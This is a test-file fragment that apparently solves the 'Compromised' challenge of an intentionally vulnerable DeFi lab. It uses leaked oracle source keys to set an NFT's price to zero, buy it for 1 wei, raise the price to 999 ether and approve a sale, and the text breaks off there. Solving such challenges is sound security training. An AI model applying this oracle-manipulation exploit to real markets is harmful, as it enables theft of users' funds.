...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    const ts1 = new ethers.Wallet(PrivateKey1, ethers.provider);
    const ts2 = new ethers.Wallet(PrivateKey2, ethers.provider);

    await oracle.connect(ts1).postPrice("DVNFT", 0);
    await oracle.connect(ts2).postPrice("DVNFT", 0);

    const buyOneRes = await exchange
      .connect(player)
      .buyOne({ value: 1 });

    const buyOneLogs = await buyOneRes.wait();
    const tokenId = buyOneLogs.events?.find((x) => {
      return x.event == "TokenBought";
    }).args[1];

    const token = (await ethers.getContractFactory("DamnValuableNFT")).attach(
      await exchange.token()
    );

    await oracle
      .connect(ts1)
      .postPrice("DVNFT", ethers.utils.parseUnits("999", "ether"));
    await oracle
      .connect(ts2)
      .postPrice("DVNFT", ethers.utils.parseUnits("999", "ether"));

    await token.connect(player).approve(exchange.address, tokenId);
